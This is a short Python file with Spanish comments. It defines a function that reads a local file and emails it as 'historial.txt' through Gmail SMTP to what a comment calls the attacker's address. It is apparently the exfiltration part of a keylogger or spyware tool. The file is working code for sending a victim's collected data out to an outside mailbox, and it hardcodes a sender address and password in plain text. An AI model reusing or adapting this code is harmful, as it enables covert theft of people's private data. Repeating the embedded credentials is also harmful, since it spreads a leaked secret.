from email.mime.multipart import MIMEMultipart
import smtplib
from email.mime.base import MIMEBase
from email import encoders

msg=MIMEMultipart()

#Envio de email al correo del atacante
def send(subject,path):
    password = "Joseluis123qwe"#password del correo donde se envia el archivo
    msg["From"]="josemowa@gmail.com"#direccion del correo donde se envia el archivo
    msg["To"]="josemowa45321@gmail.com"#correo destinatario
    msg["Subject"]=subject
    variable = MIMEBase('application', "octet-stream")
    variable.set_payload(open(path,"rb").read())
    encoders.encode_base64(variable)
    variable.add_header("Content-Disposition",'attachment;filename="historial.txt"')
    msg.attach(variable)
    servidor=smtplib.SMTP('smtp.gmail.com:587')
    servidor.starttls()
    servidor.login(msg["From"], password)
    servidor.sendmail(msg["From"],msg["To"],msg.as_string())
    servidor.quit()

